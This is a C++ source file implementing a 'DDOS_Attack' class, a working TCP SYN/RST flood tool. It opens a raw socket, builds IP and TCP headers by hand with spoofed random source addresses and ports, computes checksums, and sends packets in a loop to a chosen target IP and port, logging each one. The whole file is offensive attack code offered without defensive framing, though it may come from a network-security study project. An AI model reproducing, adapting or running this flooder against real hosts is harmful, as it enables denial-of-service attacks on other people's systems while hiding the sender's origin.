#include"ddos_attack.h"

#include"data_all.h"

int DDOS_Attack::countOfPacket;
bool DDOS_Attack::sending;
int DDOS_Attack::destination_port;
char* DDOS_Attack::destination_ip;
int DDOS_Attack::flagRst;
int DDOS_Attack::flagSyn;
string DDOS_Attack::ddos_log;

struct pseudo_header // for checksum calculation
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;

  struct tcphdr tcp;
};

void DDOS_Attack::init(){
    DDOS_Attack::countOfPacket=0;
    DDOS_Attack::sending=true;
    DDOS_Attack::destination_port = DEFAULT_PORT;
    DDOS_Attack::destination_ip= DEFAULT_IP;
    DDOS_Attack::flagRst = 0;
    DDOS_Attack::flagSyn = 1;
    DDOS_Attack::ddos_log="";
}

// random number for port spoofing(0-65535)
int DDOS_Attack::random_Port(void){
    return rand() % 65535;
}

// random number for IP spoofing(0-255)
int DDOS_Attack::random_For_Ip(void){
    return rand() % 255;
}

char* DDOS_Attack::get_random_Ip(){
    char* source_ip=(char*)malloc(sizeof (char)*32);
    strcpy(source_ip, "");
    int dots = 0;
    while (dots < 3) {
      sprintf(source_ip, "%s%d", source_ip, (int)DDOS_Attack::random_For_Ip());
      strcat(source_ip, ".");
      fflush(NULL);
      dots++;
    }
    sprintf(source_ip, "%s%d", source_ip, (int)DDOS_Attack::random_For_Ip());
    strcat(source_ip, "\0");
    return source_ip;
}

int DDOS_Attack::valid_Ip(char *ip){
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

void DDOS_Attack::stop_attack_Handler(){
    DDOS_Attack::sending=false;
    printf("\n%d [DATA] packets sent\n", countOfPacket);
}

unsigned short DDOS_Attack::checksum(unsigned short *ptr, int nbytes){
    register long sum;
    unsigned short oddbyte;
    register short ans;
    sum = 0;
    while (nbytes > 1) {
      sum += *ptr++;
      nbytes -= 2;
    }
    if (nbytes == 1) {
      oddbyte = 0;
      *((u_char *)&oddbyte) = *(u_char *)ptr;
      sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    ans = (short)~sum;

    return (ans);
}

void DDOS_Attack::solution(char* destination_ip,int destination_port,bool sign){
      char* string=(char*)malloc(1024*sizeof (char));
      memset(string,0,1024);
      srand(time(0));                // gives the random function a new seed
      DDOS_Attack::destination_ip=destination_ip;
      DDOS_Attack::destination_port=destination_port;
      if(sign){
          DDOS_Attack::flagRst = 0;
          DDOS_Attack::flagSyn = 1;
      }else{
          DDOS_Attack::flagRst = 1;
          DDOS_Attack::flagSyn = 0;
      }
      printf("[DATA] Flood is starting...\n");
      DDOS_Attack::ddos_log+="[DATA] Flood is starting...\n";

      // Create a raw socket
      int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

      // Datagram to represent the packet
      char datagram[4096];

      // IP header
      struct iphdr *iph = (struct iphdr *)datagram;

      // TCP header
      struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
      struct sockaddr_in sin;
      struct pseudo_header psh;

      sin.sin_addr.s_addr = inet_addr(DDOS_Attack::destination_ip); // set destination ip
      sin.sin_port = htons(5060);                      // socket port
      sin.sin_family = AF_INET;                        // set to ipv4

      memset(datagram, 0, 4096); /* clean the buffer */

      // IP Header
      iph->ihl = 5;                                             // header length
      iph->version = 4;                                         // Version
      iph->tos = 0;                                             // Type of service
      iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // Total length
      int rand_port=DDOS_Attack::random_Port();
      iph->id = htons(rand_port);                                   // Id of this packet
      iph->frag_off = 0;                // Fragmentation offset
      iph->ttl = 255;                   // Time to live
      iph->protocol = IPPROTO_TCP;      // Protocol tcp
      iph->check = 0;                   // Set to 0 before calculating checksum
      iph->daddr = sin.sin_addr.s_addr; // set dest IP

      // TCP Header
      tcph->dest = htons(DDOS_Attack::destination_port); // Destination port
      tcph->seq = 0;                        // Sequence number
      tcph->ack_seq = 0;
      tcph->doff = 5; /* Data offset */
      tcph->fin = 0;
      tcph->syn = DDOS_Attack::flagSyn;
      tcph->rst = DDOS_Attack::flagRst;
      tcph->psh = 0;
      tcph->ack = 0;
      tcph->urg = 0;
      tcph->window = htons(5840); /* maximum window size */
      tcph->urg_ptr = 0;

      // IP checksum
      psh.dest_address = sin.sin_addr.s_addr;
      psh.placeholder = 0;
      psh.protocol = IPPROTO_TCP;
      psh.tcp_length = htons(20);

      // tells the kernel that the IP header is included so it will fill the data
      // link layer information.
      // Ethernet header IP_HDRINCL to tell the kernel that headers are included
      // in the packet
      int one = 1;
      const int *val = &one;
      if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
            printf("[ERROR] number : %d  Error message : %s \n", errno,
                   strerror(errno));
            fprintf(stderr, "Program needs to be run by "
                            "Admin/root user\n");
            DDOS_Attack::ddos_log+="[ERROR] Program needs to be run by Admin/root user!\n";
            exit(1);
      }

      printf("[DATA] attacking ip %s on port %d and RST flag is %d...\n",
             DDOS_Attack::destination_ip, DDOS_Attack::destination_port, DDOS_Attack::flagRst);
      sprintf(string,"[DATA] attacking ip %s on port %d and RST flag is %d...\n",
              DDOS_Attack::destination_ip, DDOS_Attack::destination_port, DDOS_Attack::flagRst);
      DDOS_Attack::ddos_log+=string;
      memset(string,0,1024);

      while (DDOS_Attack::sending) {
        char* ip_source=DDOS_Attack::get_random_Ip();
        iph->saddr = inet_addr(ip_source); // random ip the source ip address
        iph->check = checksum((unsigned short *)datagram,
                              iph->tot_len >> 1); /* checksum for ip header*/

        psh.source_address =
            inet_addr(ip_source); /*update source ip in IP checksum*/

        int rand_port=DDOS_Attack::random_Port();
        tcph->source = htons(rand_port); /*random spoof port */
        tcph->check = 0;                    /*checksum is set to zero */

        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

        tcph->check =
            checksum((unsigned short *)&psh,
                     sizeof(struct pseudo_header)); /* checksum for tcp header*/
        /*
        Send the packet:our socket,the buffer containing headers and data,total
        length of our datagram,routing flags, normally always 0,socket addr, just
        like in,a normal send()
        */
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin,
                   sizeof(sin)) < 0) {
          printf("\n[ERROR] Program terminated\n");
          DDOS_Attack::ddos_log+="\n[ERROR] Program terminated\n";
          exit(1);
        } else {
          // sent successfully
          printf("[DATA] IP(%s) at PORT(%d) is attacking IP(%s) at PORT(%d)!\n",ip_source,tcph->source,DDOS_Attack::destination_ip,DDOS_Attack::destination_port);
          sprintf(string,"[DATA] IP(%s) at PORT(%d) is attacking IP(%s) at PORT(%d)!\n",ip_source,tcph->source,DDOS_Attack::destination_ip,DDOS_Attack::destination_port);
          DDOS_Attack::ddos_log+=string;
          memset(string,0,1024);

          DDOS_Attack::countOfPacket++;
          sleep(DEFAULT_TIME_STEP);
        }

        vector<std::string> data;
        data.push_back(STATE_SEND);
        data.push_back(ip_source);
        data.push_back(to_string(rand_port));
        data.push_back(DDOS_Attack::destination_ip);
        data.push_back(to_string(DDOS_Attack::destination_port));
        data.push_back(PROTOCOL_TCP);
        Data* temp=new Data(data);
        Data::datas.push_back(temp);

      }


      close(s);
}
